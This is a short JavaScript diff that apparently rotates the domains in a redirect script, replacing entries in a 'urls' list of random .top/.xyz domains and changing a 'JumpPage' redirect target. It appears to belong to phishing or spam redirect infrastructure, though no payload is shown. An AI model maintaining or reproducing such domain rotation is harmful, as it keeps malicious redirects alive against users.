@@ -37,11 +37,11 @@ var emails = [
 ];
 
 var urls=[];
-       urls.push(".eeerytid.top"); 
-       urls.push(".hbxqqvjl.top");
-       urls.push(".yyfbcsn.xyz");   
+       urls.push(".hbxqqvjl.top"); 
+       urls.push(".eeerytid.top");
+       urls.push(".cnnfexm.top");   
             		
-var JumpPage="https://fxfhasnx.top";
+var JumpPage="https://csemkay.com";
 
 var newestUrls = [];
 
